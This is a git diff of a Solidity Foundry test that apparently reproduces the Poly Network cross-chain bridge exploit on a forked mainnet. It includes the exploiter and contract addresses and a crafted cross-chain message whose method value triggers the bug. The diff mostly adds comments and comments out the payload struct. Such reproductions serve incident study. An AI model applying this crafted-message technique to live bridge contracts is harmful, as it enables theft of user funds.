@@ -56,14 +56,17 @@ contract ContractTest is DSTest {
         bytes method;
         bytes args;
     }
-
-    address exploiter = 0xC8a65Fadf0e0dDAf421F28FEAb69Bf6E2E589963; 
-    address EthCrossChainManager =  0x838bf9E95CB12Dd76a54C9f9D2E3082EAF928270;
-    address EthCrossChainData = 0xcF2afe102057bA5c16f899271045a0A37fCb10f2;
+    //this is a transaction using newest contracts 
+    address exploiter =  0xC8a65Fadf0e0dDAf421F28FEAb69Bf6E2E589963; 
+    // 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0; 
+    address EthCrossChainManager = 0x838bf9E95CB12Dd76a54C9f9D2E3082EAF928270;  
+    //0xcF2afe102057bA5c16f899271045a0A37fCb10f2; //reply:
+    address EthCrossChainData =  0xcF2afe102057bA5c16f899271045a0A37fCb10f2;
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
+        //info: https://www.hecoinfo.com/en-us/address/0xd0e79cb89b46330d3ac5a9b5477783837882737c?tab=Transactions
         cheats.createSelectFork("mainnet", 12996658); //fork mainnet at block 12996658
     }
 
@@ -122,6 +125,7 @@ contract ContractTest is DSTest {
         // nodehash: ee1671b66cad1415453c0544d7e4425c1632e1b7dfdae3bd642ed7954e9f9b0d
         // bytes memory toMerkleValueBs = ECCUtils.merkleProve(proof, header.crossStatesRoot);
         // ECCUtils.ToMerkleValue memory toMerkleValue = ECCUtils.deserializeMerkleValue(toMerkleValueBs);
+       /*
         ToMerkleValue memory toMerkleValue = ToMerkleValue({
             txHash: hex"80cc978479eb082e1e656993c63dee7a5d08a00dc2b2aab88bc0e465cfa0721a", // cross chain txhash 
             fromChainID: 3,
@@ -131,10 +135,12 @@ contract ContractTest is DSTest {
                 fromContract: hex"e1a18842891f8e82a5e6e5ad0a06d8448fe2f407",
                 toChainId: 2,
                 toContract: abi.encodePacked(EthCrossChainData),
+                //the value below leads to the bug
                 method: hex"6631313231333138303933", // bytes.fromhex("6631313231333138303933") => b'f1121318093'
                 args: hex"010000000000000014a87fb85a93ca072cd4e5f0d4f178bc831df8a00b"
             })
-        });    
+        }); 
+        */   
 
         // https://github.com/polynetwork/eth-contracts/blob/d16252b2b857eecf8e558bd3e1f3bb14cff30e9b/contracts/core/cross_chain_manager/logic/EthCrossChainManager.sol#L127
         IEthCrossChainManager(EthCrossChainManager).verifyHeaderAndExecuteTx({ // 0xd450e04c
